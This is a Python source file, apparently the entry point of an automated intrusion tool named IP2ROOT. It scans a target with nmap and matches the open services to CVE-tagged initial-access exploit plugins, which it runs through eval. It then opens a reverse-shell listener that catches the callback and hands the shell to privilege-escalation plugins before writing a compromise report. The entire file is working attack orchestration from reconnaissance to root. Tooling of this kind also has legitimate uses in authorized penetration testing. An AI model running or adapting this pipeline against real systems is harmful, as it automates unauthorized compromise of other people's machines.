import argparse
import socket
import recon
import socket
from multiprocessing import Process
import rs_client
import sys
import configparser
import os
from utils import *
from plugins.initial_access import *
import constants
import privesc


def read_plugins_configs() -> dict:
    """
    Read all the plugins config files
    """
    config = configparser.ConfigParser()
    current_dir = os.path.dirname(os.path.abspath(__file__))
    initial_plugins_path = os.path.join(current_dir, constants.PLUGINS_DIR, constants.INITIAL_ACCESS_PLUGINS_DIR)
    configs = dict()
    for f in os.listdir(initial_plugins_path):
        if f.endswith('.ini'):
            config.read(os.path.join(initial_plugins_path, f))
            configs[config['DEFAULT']['plugin_name']] = { 
                'service' : config['DEFAULT']['service'],
                'versions' : config['DEFAULT']['versions'],
                'extrainfo' : config['DEFAULT']['extrainfo'],
                'http_title' : config['DEFAULT']['http-title'],  
                'CVE' : config['DEFAULT']['CVE'], 
                'CVSS' : config['DEFAULT']['CVSS'] 
            }
    return configs


def listener(listener_port: int, listener_address: str, compromission_recap_file_name: str) -> None:
    """
    Create a listener that waits for a connection from the reverse shell
    """
    sys.stdin = open(0)
    persistent = False
    hosts = None
    sock = None

    if hosts:
        hosts = hosts.split(",")

    try:
        sock = rs_client.Socket(listener_port, listener_address)
        sock.listen(hosts)
        shell = rs_client.Shell(sock, persistent)
        privesc.load_all_plugins(sock, shell, compromission_recap_file_name)

    except KeyboardInterrupt:
        sock.close()


def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str) -> None:
    """
    Run an initial access plugin
    """
    try:
        print('[+] Running plugin {}'.format(plugin_name))
        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port)
        if res is True:
            ('[+] Exploit was successful !')
            if compromission_recap_file_name:
                with open(compromission_recap_file_name, 'w') as report:
                    report.write('# IP2ROOT report\n\n')
                    report.write('## IP address and Port\n`{}:{}`\n'.format(args.target_ip, target_port))
                    print(plugin_config)
                    print(safe_get(plugin_config, 'CVE'))
                    if safe_get(plugin_config, 'CVE'):
                        report.write('## Vulnerability used for initial access\n`{}`\n'.format(plugin_name))
                        report.write('CVE: {}\n'.format(safe_get(plugin_config, 'CVE')))
                        report.write('CVSS: {}\n'.format(safe_get(plugin_config, 'CVSS')))
    except Exception as e:
        print(e)


def extract_ip() -> None | str:
    """
    Return the local IP of the machine
    """
    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:       
        st.connect(('10.255.255.255', 1))
        IP = st.getsockname()[0]
    except Exception as e:
        print(e)
        sys.exit()
    finally:
        st.close()
    return IP

if __name__ == '__main__':

    configs = read_plugins_configs()
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    parser.add_argument('-l', '--local_ip', type=str, help='local ip', required=False)
    parser.add_argument('-lp', '--local_port', default=9001, type=int, help='local port', required=False)
    parser.add_argument('-rp', '--remote_port', type=int, required=False)
    parser.add_argument('-o', '--output', type=str, help='output report file name (.md format)', required=False)
    args = parser.parse_args()


    if args.local_ip == None:
        LOCAL_IP = extract_ip()
    else:
        LOCAL_IP = args.local_ip

    # validate IP addresses' format
    validate_ip_address(args.target_ip)
    validate_ip_address(LOCAL_IP)
    
    res_recon = recon.nmap_scan(args.target_ip, args.remote_port)

    BUFFER_SIZE = 1024 * 128
    SEPARATOR = '<sep>'
    
    for i in res_recon:
        print('[+] Looking for exploits for port {}'.format(i['port']))
        for plugin_name, values in configs.items():
            if ((safe_get(i, 'product') and safe_get(i, 'product') == safe_get(values, 'service')) and (safe_get(i,'version') and safe_get(i, 'version') in safe_get(values, 'versions'))) \
            or (safe_get(i,'extrainfo') and safe_get(i, 'extrainfo') == safe_get(values, 'extrainfo')) \
            or (safe_get(i, 'http_title') and safe_get(values, 'http_title') and safe_get(values, 'http_title') in safe_get(i, 'http_title')):
                target_port = i['port']
                listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP, args.output))
                listener_process.start()
                exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output))
                exploit_process.start()
                listener_process.join()
                exploit_process.join()
            else:
                print('[-] No exploit available for this port')
    if args.output :
        print("[+] Report available in {}".format(args.output))
    else : 
        print("[-] No output file provided for a report, --output <filename.md> allows to create a report")